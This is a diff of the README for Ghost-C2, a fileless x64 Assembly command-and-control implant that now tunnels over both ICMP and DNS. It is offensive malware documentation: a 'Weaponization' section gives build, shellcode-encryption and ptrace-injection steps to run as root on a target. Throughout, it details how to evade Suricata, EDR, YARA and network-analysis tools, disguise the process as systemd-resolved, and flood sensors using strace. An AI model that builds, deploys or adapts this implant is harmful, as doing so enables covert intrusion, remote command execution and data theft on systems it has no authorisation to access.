@@ -1,61 +1,54 @@
 <div align="center">
 
 ```
- ________  ___  ___  ________  ________  _________        ________  ________   
-|\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \  
-\ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \ 
- \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \
-  \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \
-   \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
-    \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
-                                  \|_________|                                   
+ ________  ___  ___  ________  ________  _________       ________  ________   
+|\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\    |\   ____\|\_____  \  
+\ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|    \ \  \___|\|____|\  \ 
+ \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \      \ \  \     ____\_\  \
+  \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \      \ \  \___|\____ \  \
+   \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\      \ \______\\_________\
+    \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
+                                 \|_________|                                   
 ```
 
-# Ghost-C2
+> Fileless, pure x64 Assembly C2 implant utilizing a Dual-Channel (ICMP / DNS) architecture. Zero libc. Zero disk. Invisible to standard EDR hooks.
 
-**A fileless, pure x64 Assembly C2 implant using ICMP as a covert channel.**  
-**Zero libc. Zero disk. Invisible to standard EDR hooks.**
-
+---
 ![Architecture](https://img.shields.io/badge/Architecture-x86__64-red.svg)
 ![Language](https://img.shields.io/badge/Language-Pure%20Assembly-green.svg)
 ![Protocol](https://img.shields.io/badge/Protocol-ICMP-blue.svg)
+![Protocol](https://img.shields.io/badge/Protocol-DNS-blue.svg)
 ![OS](https://img.shields.io/badge/OS-Linux-orange.svg)
-![Version](https://img.shields.io/badge/Version-3.6-purple.svg)
+![Version](https://img.shields.io/badge/Version-3.6.2-purple.svg)
 ![Suricata](https://img.shields.io/badge/Suricata%20v8.0.3-Bypassed-brightgreen)
 
-</div>
-
----
+# Ghost-C2
 
 ## Overview
 
-Ghost-C2 is a command-and-control framework written entirely in **pure x64 Linux Assembly** with no libc dependencies. Every operation goes through direct syscalls. There are no import tables, no dynamic linker artifacts, and no disk writes.
+Ghost-C2 is a command-and-control framework written entirely in pure x64 Linux Assembly with no libc dependencies. Every operation goes through direct syscalls. There are no import tables, no dynamic linker artifacts, and no disk writes.
 
-The C2 channel runs over **raw ICMP sockets**, hiding inside standard diagnostic traffic. The implant lives exclusively in RAM, injected into a running system process via a custom ptrace-based loader.
+Originally built as a raw ICMP stealth channel, version 3.6.2 introduces a **Dual-Channel Protocol Pivoting** architecture. Operators can seamlessly switch the implant's communication channel between silent ICMP Raw Sockets and evasive DNS UDP Tunneling on the fly. The implant lives exclusively in RAM, injected into a running system process via a custom ptrace-based loader.
 
-This project was built to explore how far user-space stealth can go without touching the kernel.
-
-![Architecture](https://github.com/user-attachments/assets/36dde87a-0790-4721-9ab6-f34fbfd75bc4)
+This project was built to explore how far user-space stealth and network state synchronization can go without touching the kernel.
 
 ---
 
 ## Architecture
 
 ```
-
-
 ┌─────────────────────────────────────────────────────────────┐
 │                      OPERATOR MACHINE                       │
 │                                                             │
 │   ┌──────────────┐                                          │
-│   │  client.asm  │  ← Terminal UI: prompt for IP + command  │
+│   │  client.asm  │  ← Terminal UI: Prompt IP/Domain + Cmd   │
 │   │  (Operator   │    Encrypts payload with Rolling XOR     │
-│   │   Console)   │    Sends ICMP Echo Request (Type 8)      │
-│   └──────┬───────┘    Auth key: ID + SEQ = 45,000           │
+│   │   Console)   │    State Sync: ICMP mode / DNS mode      │
+│   └──────┬───────┘                                          │
 │          │                                                  │
 └──────────┼──────────────────────────────────────────────────┘
-           │  Raw ICMP (port-less, stateless)
-           │
+           │  Channel 1: Raw ICMP (Stateless, Port-less)
+           │  Channel 2: DNS UDP Port 53 (Asymmetric)
 ┌──────────┼──────────────────────────────────────────────────┐
 │          │             TARGET MACHINE                       │
 │          ▼                                                  │
@@ -65,17 +58,16 @@ This project was built to explore how far user-space stealth can go without touc
 │   │   Loader)    │     │         inside host process     │  │
 │   └──────────────┘     └────────────────┬────────────────┘  │
 │                                         │                   │
-│   1. Scans /proc for target PID         │ Receives ICMP Req │
-│   2. ptrace ATTACH                      │ Validates auth    │
+│   1. Scans /proc for target PID         │ Listens ICMP/DNS  │
+│   2. ptrace ATTACH                      │ Validates Auth    │
 │   3. Force remote mmap (RW)             │ Decrypts command  │
 │   4. Inject PIC shellcode               │ fork+execve       │
 │   5. mprotect → RX                      │ memfd_create      │
 │   6. Redirect RIP → shellcode           │ Compress(DPCM-RLE)│
 │   7. ptrace DETACH → exits              │ Encrypt & Frag.   │
-│                                         │ Sends ICMP Reply  │
-│                                         │ (Auth: 55,000)    │
+│                                         │ Sends Reply       │
 └─────────────────────────────────────────┼───────────────────┘
-                                          │  Raw ICMP + Jitter
+                                          │  Encrypted Traffic
                                           ▼
                                    [ client.asm ]
                                    Receives & Validates
@@ -89,229 +81,106 @@ This project was built to explore how far user-space stealth can go without touc
 ## Components
 
 ### `client.asm` — Operator Console
-The attacker-side terminal. Takes a target IP and command from stdin, encrypts the payload, and dispatches it as an ICMP Echo Request. Listens for fragmented ICMP Echo Replies and reconstructs the output.
+The attacker-side terminal. Handles UI, dynamic memory management, and target state synchronization. Can dispatch packets as either ICMP Echo Requests or DNS TXT queries. Listens for fragmented replies, prevents buffer overflows, and reconstructs the output. Features an "Active Target Reconnection" module to rescue orphaned sessions.
 
 ### `sniff.asm` — PIC Implant Agent
-The implant running on the target. Compiled as a **raw binary** (position-independent, no ELF headers) so it can be injected into arbitrary memory addresses. It:
-- Listens passively on a raw ICMP socket
-- Validates incoming packets using the asymmetric key sum
-- Decrypts the command, forks a shell, captures output via `memfd_create`
-- Fragments and sends the output back in 56-byte ICMP chunks
+The implant running on the target. Compiled as a raw binary (position-independent, no ELF headers) so it can be injected into arbitrary memory addresses. It dynamically updates its internal VTable to switch between ICMP sniffing and UDP DNS binding based on operator pivot commands.
 
 ### `Phantom_Loader/loader.asm` — Injection Engine
-The delivery mechanism. Scans `/proc`, finds a target process by `comm` name, and injects the PIC shellcode into it using a multi-stage ptrace state machine. Exits cleanly after injection — leaves no trace.
+The delivery mechanism. Scans `/proc`, finds a target process by comm name, and injects the PIC shellcode into it using a multi-stage ptrace state machine. Exits cleanly after injection — leaves no trace.
 
 ---
 
 ## Stealth & Evasion Techniques
 
+### Dual-Channel Protocol Pivoting (ICMP ↔ DNS)
+Ghost-C2 v3.6.2 allows the operator to hot-swap the network protocol without losing the agent. By sending specific pivot commands, the VTables in both the Master and the Agent are dynamically overwritten:
+
+- **`!D` (Pivot to DNS):** Both nodes close ICMP sockets and initialize UDP Port 53 communication. Ideal for bypassing strict Layer 3 filtering by blending into corporate DNS traffic.
+- **`!I` (Pivot to ICMP):** The Agent closes UDP sockets, kills port bindings, and drops back into silent Raw Socket sniffing. Perfect for "Phantom" stealth mode.
+
 ### DPCM-RLE Hybrid x64 Compressor
-Ghost-C2's data transmission engine utilizes a hybrid compression and encoding layer heavily optimized in x86-64 Assembly. This architecture reduces data volume while ensuring the traffic profile remains natural.
+Ghost-C2's data transmission engine utilizes a hybrid compression and encoding layer heavily optimized in x86-64 Assembly.
 
-### Differential Pulse Code Modulation (DPCM):
-Instead of transmitting raw ASCII values, the engine calculates and sends the mathematical difference (Delta) between a reference character (Anchor) and the subsequent ones. This method drastically lowers the entropy of data with similar character ranges.
+- **DPCM** (Differential Pulse Code Modulation): Calculates and sends the mathematical difference (Delta) between a reference character and subsequent ones, lowering data entropy.
+- **RLE** (Run-Length Encoding): Packs consecutive spaces and repeating blocks at the bit level.
+- **Result:** Reduces overall data payload by 40% to 55%, minimizing network footprint and the number of injected packets.
 
-```nasm
-mov al, byte [rsi]    ; Read new character
-mov dl, al
-sub al, bl            ; Calculate difference (Delta) from Anchor (bl)
-mov r9b, al           ; Save Delta
-mov bl, dl            ; Set new Anchor
-```
-
-### Run-Length Encoding (RLE):
-Working in tandem with DPCM, the RLE engine packs consecutive spaces and repeating permission blocks—frequently seen in outputs like ls -la—at the bit level.
-
-```nasm
-.comp_flush:
-mov byte [rdi], r8b   ; Write repetition count (Count)
-inc rdi
-mov byte [rdi], r9b   ; Write Delta value
-```
-### Stealth & Efficiency Gains:
-**Bandwidth Optimization: Reduces the overall data payload by an average of 40% to 55% for text-based command outputs (ASCII/UTF-8).**
-
-**Minimal Network Footprint: Shrinking the data payload halves the number of injected ICMP packets, significantly lowering the risk of triggering IDS/IPS anomaly radars.**
-
-**100% Data Fidelity: Stack offsets are strictly confined to a safe memory region (0x100000), and synchronization desyncs have been eliminated. Massive datasets of 20KB+ (e.g., /etc dumps) are reliably transmitted without shifting a single bit.**
-
-**dpcm-rle-hybrid-x64-compressor:**
-https://github.com/JM00NJ/Vesqer-Baremetal-Compressor-DPCM-RLE-Hybrid-Engine
-
-### Protocol Mimicry
+### ICMP Protocol Mimicry
 Every outgoing ICMP packet is structured to be indistinguishable from a standard Linux `ping`:
-
-```
-Offset  0-7   : ICMP Header (Type, Code, Checksum, ID, SEQ)
-Offset  8-15  : Dynamic RDTSC timestamp  ← mimics struct timeval
-Offset 16-31  : 0x10, 0x11 ... 0x1F     ← exact Linux iputils padding
-Offset 32+    : Encrypted payload        ← past most DPI scan depth
-```
-
-Signature-based IDS engines (Suricata, Snort) see standard padding and stop scanning before reaching the payload. This is the **Stealth Gap**.
-
-### Asymmetric Authentication
-The implant ignores all packets where `ID + SEQ ≠ 45,000`. Random internet scanners, automated security tools, and honeypots will never trigger it. The implant replies with packets where `ID + SEQ = 55,000`, making the two directions mathematically distinct and preventing OS echo confusion.
+- Dynamic RDTSC timestamps mimic `struct timeval`.
+- Exact Linux `iputils` padding (`0x10` to `0x1F`) bypasses basic heuristic firewalls.
 
 ### Rolling XOR Cipher
-Both directions are encrypted with a progressively shifting key:
+Both directions are encrypted with a progressively shifting QWORD key. This keeps Shannon entropy low (unlike AES, which scores ~8.0 and triggers DPI anomalies). Rolling XOR produces entropy that looks like naturally noisy data. No cryptographic constants, no S-boxes, nothing for YARA to match.
 
-```nasm
-mov dl, 0x42      ; seed
-xor [rsi], dl     ; encrypt byte
-add dl, 0x07      ; shift key
-inc rsi
-loop .loop
-```
-
-This keeps Shannon entropy low — AES-encrypted ICMP traffic scores ~8.0 and triggers DPI anomaly alerts. Rolling XOR produces entropy that looks like compressed or naturally noisy data. **No cryptographic constants, no S-boxes, nothing for YARA to match.**
-
-### Adaptive Jitter (RDTSC-based)
-Packet transmission intervals are randomized using the CPU's hardware timestamp counter, not software timers. This produces timing patterns that are mathematically non-periodic — ML-based NTA engines (Darktrace, Cisco Stealthwatch) require periodicity to flag C2 beaconing.
-
-```nasm
-rdtsc
-xor rdx, rdx
-mov ecx, 900000000
-div ecx             ; RDX = random 0–900ms
-add edx, 100000000  ; minimum 100ms
-```
+### Asymmetric Authentication
+The implant ignores all ICMP packets where `ID + SEQ ≠ 45,000`. The implant replies with packets where `ID + SEQ = 55,000`. This prevents OS echo confusion and filters out internet scanners or honeypots.
 
 ### Fileless Execution via `memfd_create`
-Command output never touches disk:
-
-```
-fork()
-  child: dup2(memfd, stdout) → execve("/bin/sh", ["-c", cmd])
-  parent: wait4() → lseek(0) → read loop → fragment → send
-```
-
-The memfd is named `[shm]`, matching the format of legitimate shared memory mappings in `/proc/PID/fd`. Standard `lsof` output shows nothing suspicious.
+Command output never touches disk. The shell output is captured via an anonymous RAM file (`memfd_create`), named `[shm]` to blend into legitimate shared memory mappings in `/proc/PID/fd`.
 
 ### W^X Memory Injection (Phantom Loader)
-Modern kernel mitigations forbid RWX memory. The loader uses a two-phase approach:
-
-```
-Phase 1: Remote mmap with PROT_READ | PROT_WRITE
-         → Inject shellcode via PTRACE_POKEDATA
-Phase 2: Remote mprotect → PROT_READ | PROT_EXEC
-         → No page is ever simultaneously W and X
-```
-
-EDR memory scanners looking for RWX anomalies find nothing.
+Defeats modern kernel mitigations that forbid RWX memory. The loader uses a two-phase approach (`Remote mmap` with RW → Inject → `Remote mprotect` with RX). No page is ever simultaneously W and X.
 
 ### Libc-Free Syscall Obfuscation
-All syscall numbers are split across two instructions to defeat static analysis and simple grep-based scanners:
-
-```nasm
-; sys_memfd_create (319)
-mov rax, 300
-add rax, 19
-syscall
-
-; sys_ptrace (101)
-mov rax, 99
-add rax, 2
-syscall
-```
+All syscall numbers are split across two instructions to defeat static analysis and simple grep-based scanners.
 
 ---
 
-## Phantom Loader — ptrace Injection Chain
+## Weaponization: Configuring & Building the Agent
 
-The loader performs a deterministic, multi-step injection without any external dependencies:
+To maintain strict OPSEC, the Ghost-C2 agent (`sniff.asm`) does not use external configurations. You must define your Master C2 IP, Port, and Decoy DNS Domain directly inside the assembly code before compiling and injecting.
 
-```
-1. Open /proc with sys_getdents64
-2. Scan linux_dirent64 entries for numeric directories (PIDs)
-3. Read /proc/<PID>/comm → compare against target name
-4. ptrace(PTRACE_ATTACH, pid)
-5. wait4() loop with branchless sleep (cmovz/cmovs)
-6. PTRACE_GETREGS → save register state + RIP
-7. PTRACE_POKEDATA → write syscall opcode (0x050F) at RIP
-8. PTRACE_SETREGS → configure mmap arguments in registers
-9. PTRACE_SINGLESTEP → execute remote mmap
-10. wait4() → PTRACE_GETREGS → read mmap return value (new address)
-11. PTRACE_POKEDATA loop → write 1444-byte PIC payload (8 bytes/iter)
-12. PTRACE_SETREGS → configure mprotect (PROT_READ | PROT_EXEC)
-13. PTRACE_SINGLESTEP → execute remote mprotect
-14. PTRACE_POKEDATA → restore original bytes at RIP
-15. PTRACE_SETREGS → set RIP = injected payload address
-16. PTRACE_DETACH → host process resumes, now running the implant
+### Step 1: Configure OPSEC Variables
+Open `sniff.asm` and scroll to the very bottom of the `.text` segment. *(Note: Because the agent is strictly Position Independent Code (PIC), there is no `.data` segment. All configuration variables are stored inline).*
+
+Modify the following values to match your Master Server:
+- **IP Address:** Change `db 127, 0, 0, 1` to your Master's IP.
+- **UDP Port:** Change `dw 0xB414` (Port 5300) to your desired port in Network Byte Order (e.g., `0x3500` for Port 53).
+- **Decoy Domain:** Change `fake_domain` (e.g., `ghost.com`) to match the authoritative domain configured on your Master.
+
+### Step 2: Assemble to Raw Shellcode
+```bash
+nasm -f bin sniff.asm -o shellcode.bin
 ```
 
-The loader exits immediately after step 16. The host process continues its normal operation with Ghost-C2 running inside it.
+### Step 3: Format the Shellcode
+```bash
+python3 -c "data = open('shellcode.bin', 'rb').read(); lines = ['\tdb ' + ', '.join(f'0x{b:02x}' for b in data[i:i+12]) for i in range(0, len(data), 12)]; open('c2_payload.txt', 'w').write('\n'.join(lines))"
+```
 
-> **Known Limitation:** Processes confined by AppArmor or SELinux (enforce mode) will block `mprotect` across different memory regions. The loader targets **unconfined** root processes such as `cron` or `VBoxService`. A bypass for MAC-confined services is planned for v4.x.
+### Step 4: Encrypt the Payload (Rolling XOR)
+1. Copy the contents of the generated `c2_payload.txt`.
+2. Open `xor.py` and replace the `raw_asm` variable's contents with your copied shellcode.
+3. Run `python3 xor.py` and copy the encrypted output.
+
+### Step 5: Inject into the Phantom Loader
+1. Open `loader.asm`.
+2. Locate the `c2_payload:` label.
+3. Delete the existing placeholder and paste your encrypted shellcode directly under the label.
+4. *(Optional: Change the target injection process by modifying `target db "cron", 10`).*
+
+### Step 6: Compile the Final Loader
+```bash
+nasm -f elf64 loader.asm -o loader.o
+ld loader.o -o loader
+```
+
+Execute on the target machine with root privileges (`sudo ./loader`). The agent is now running entirely fileless.
 
 ---
 
-## Build & Usage
+## Build & Usage (Operator Console)
 
-### Prerequisites
-- NASM (Netwide Assembler)
-- GNU ld (linker)
-- Root privileges (required for raw sockets and ptrace)
-
-### Standalone Agent (v3.0 compatible)
+Build the operator client (`client.asm`):
 
 ```bash
-# Build the agent
-nasm -f elf64 sniff.asm -o sniff.o && ld sniff.o -o systemd-resolved
-
-# Build the client
 nasm -f elf64 client.asm -o client.o && ld client.o -o client
-
-# Deploy (target machine)
-sudo ./systemd-resolved
-
-# Operate (attacker machine)
 sudo ./client
 ```
 
-> **Tip:** Name the binary at least 15 characters (e.g., `systemd-resolved`) to provide enough stack buffer for clean `argv[0]` overwrite without environment variable bleed.
-
-## Verification
-
-After deployment, the agent disappears from standard process listings:
-
-```bash
-$ ps aux | grep systemd-resolved
-root  3887  0.0  0.0  192  16 ?  Ss  19:42  0:00 systemd-resolved
-```
-
-The only way to identify the true binary is through `/proc`:
-
-```bash
-$ sudo ls -la /proc/3887/exe
-lrwxrwxrwx 1 root root 0 ... /proc/3887/exe -> /path/to/systemd-resolved
-```
-
----
-
-### Phantom Loader (v3.6)
-
-The PIC shellcode is pre-compiled and already embedded in `loader.asm`. Only rebuild it if you modify the agent source:
-
-```bash
-# (Optional) Recompile PIC shellcode after modifying sniff_pic.asm
-cd Phantom_Loader
-nasm -f bin sniff_pic.asm -o shellcode.bin
-
-# Build the loader
-nasm -f elf64 loader.asm -o loader.o && ld loader.o -o loader
-
-# (Optional) Binary Optimization & Anti-Forensics
-strip --strip-all loader
-
-# Execute (target process must be running)
-sudo strace ./loader
-```
-
-**💡 Evasion Note (Syscall Noise Masking via LotL):**
-Execution is intentionally wrapped with strace. This leverages a Living off the Land (LotL) technique to generate massive amounts of legitimate debugging noise. By flooding kernel-level eBPF sensors (like Falco) with standard PTRACE_ATTACH logs, the actual malicious injection is masked through "Alert Flooding". This effectively buries the single injection anomaly within a sea of standard debug operations, often causing defense mechanisms and analysts to dismiss the event as a false-positive.
-
-**The target process name is hardcoded in `loader.asm`. See inline comments to change it.**
+> **Note:** The Operator Console requires root privileges to bind raw sockets and UDP port 53.
 
 ---
 
@@ -330,20 +199,19 @@ Tested in a controlled lab environment against active traffic inspection:
 
 ## Syscall Reference
 
-Ghost-C2 interacts directly with the Linux kernel. No wrappers, no libc:
+Ghost-C2 interacts directly with the Linux kernel:
 
 | Syscall | Number | Usage |
 |---|---|---|
-| `sys_socket` | 41 | Raw ICMP socket creation |
-| `sys_recvfrom` | 45 | Passive ICMP packet capture |
-| `sys_sendto` | 44 | ICMP reply transmission |
+| `sys_socket` | 41 | Raw ICMP / UDP socket creation |
+| `sys_recvfrom` | 45 | Passive ICMP/UDP packet capture |
+| `sys_sendto` | 44 | ICMP/UDP reply transmission |
+| `sys_bind` | 49 | UDP DNS Port binding |
 | `sys_memfd_create` | 319 | Anonymous RAM file for output |
 | `sys_dup2` | 33 | stdout/stderr redirection |
 | `sys_execve` | 59 | Shell command execution |
 | `sys_fork` | 57 | Process isolation |
-| `sys_nanosleep` | 35 | Jitter implementation |
 | `sys_ptrace` | 101 | Process injection + anti-debug |
-| `sys_prctl` | 157 | Process masquerade + anti-dump |
 | `sys_getdents64` | 217 | /proc directory parsing |
 | `sys_mmap` | 9 | Remote memory allocation |
 | `sys_mprotect` | 10 | W^X permission switch |
@@ -352,15 +220,12 @@ Ghost-C2 interacts directly with the Linux kernel. No wrappers, no libc:
 
 ## Roadmap
 
-**v4.x — MAC Bypass Research**
+### v4.0 — DNS RFC Compliance & Asynchronous Beaconing
+- **RFC Headers:** Currently, the DNS tunneling module operates on raw Hex/Base32 over UDP, which triggers "Malformed Packet" warnings in Wireshark. v4.0 will wrap payloads in fully compliant RFC 1035 headers (Transaction IDs, QTYPE, etc.) to bypass strict IDS/IPS protocol anomaly detection.
+- **Asynchronous Jitter / Nonce:** To successfully route payloads through Public ISP caches to the C2 Authoritative Name Server, a unique randomized nonce/jitter will be prepended to every subdomain query to prevent DNS caching drops.
 
-The primary research target is bypassing AppArmor and SELinux confined processes. Current candidates:
-
-- ROP-based execution using gadgets from the target's own executable memory (Living off the Land in memory)
-- Dynamic ASLR defeat for gadget address resolution
-- Eliminating `mprotect` dependency entirely by executing within existing RX pages
-
-This is a long-term R&D effort. Pure assembly ROP chain construction with dynamic gadget discovery is a non-trivial problem space.
+### v4.x — MAC Bypass Research
+Research into bypassing AppArmor and SELinux confined processes using ROP-based execution (Living off the Land in memory) and dynamic ASLR defeat to eliminate `mprotect` dependencies.
 
 ---
 
@@ -368,41 +233,42 @@ This is a long-term R&D effort. Pure assembly ROP chain construction with dynami
 
 The absence of a PTY is an architectural decision, not a limitation:
 
-**Protocol integrity:** ICMP is stateless. Emulating TCP-like ordered delivery for a TTY stream would bloat the codebase and destroy the lightweight design.
-
-**Volumetric stealth:** An interactive shell generates ICMP traffic for every keystroke. This creates a detectable frequency spike. Ghost-C2 is designed to stay below anomaly detection thresholds.
-
-**EDR surface:** Allocating a PTY requires `/dev/ptmx` and `ioctl` calls that EDRs heavily monitor. Spawning an interactive shell without a legitimate parent daemon leaves behavioral artifacts.
+- **Protocol integrity:** ICMP and DNS are stateless/asymmetric. Emulating TCP-like ordered delivery for a TTY stream would bloat the codebase and destroy the lightweight design.
+- **Volumetric stealth:** An interactive shell generates traffic for every keystroke, creating a detectable frequency spike.
+- **EDR surface:** Allocating a PTY requires `/dev/ptmx` and `ioctl` calls that EDRs heavily monitor.
 
 Ghost-C2 is a hyper-stealth command execution and exfiltration implant. Interactivity trades invisibility for convenience — this project chose invisibility.
 
 ---
 
+## Contributing
 
+By design, Pull Requests and Forks are strictly ignored. The architecture of this project is maintained directly by the author. If you find a bug, logic flaw, or have a feature suggestion, please open an Issue. Keep it objective and technical.
+
+---
 
 ## Resources
 
-- **Blog / Technical Writeup:** [netacoding.com/posts/icmp-ghost](https://netacoding.com/posts/icmp-ghost) 
+- **Blog / Technical Writeup:** [netacoding.com/posts/icmp-ghost](https://netacoding.com/posts/icmp-ghost)
 - **Author:** [github.com/JM00NJ](https://github.com/JM00NJ)
 - **Related Resource:** [netacoding.com/posts/compressdpcm-rle](https://netacoding.com/posts/compressdpcm-rle)
+
 ---
 
 ## 💖 Support the Project
 
 Ghost-C2 is built with passion, sweat, and pure x64 Assembly. If this project helped you understand low-level evasion, protocol mimicry, or just made your red teaming operations smoother, consider supporting the development!
 
-Your support helps me buy more coffee and spend more sleepless nights fighting `SIGSEGV` errors to bring you cleaner, stealthier implants.
-
-[👉 Become a Sponsor on GitHub](https://github.com/sponsors/JM00NJ)
+👉 [Become a Sponsor on GitHub](#)
 
 ---
 
-### ⚖️ Disclaimer & License (AGPL-3.0)
+## ⚖️ Disclaimer & License (AGPL-3.0)
 
-Ghost-C2 is developed strictly for **educational purposes, reverse engineering, and authorized cybersecurity research**. 
+Ghost-C2 is developed strictly for **educational purposes**, reverse engineering, and authorized cybersecurity research.
 
-As of version 3.6.1 and onwards, this project is licensed under the **GNU Affero General Public License v3.0 (AGPLv3)**. Any entity interacting with or modifying this software over a network must disclose their complete source code as mandated by the license. Commercial exploitation or integration into proprietary/closed-source platforms is strictly prohibited. 
+As of version 3.6.1 and onwards, this project is licensed under the **GNU Affero General Public License v3.0 (AGPLv3)**. Any entity interacting with or modifying this software over a network must disclose their complete source code as mandated by the license. Commercial exploitation or integration into proprietary/closed-source platforms is strictly prohibited.
 
-**Copyright (c) 2026 JM00NJ (commSync). All Rights Reserved.**
+*Copyright (c) 2026 JM00NJ (commSync). All Rights Reserved.*
 
-The author is not responsible for any illegal use or damage caused by this tool. Use it at your own risk.
+> The author is not responsible for any illegal use or damage caused by this tool. Use it at your own risk.
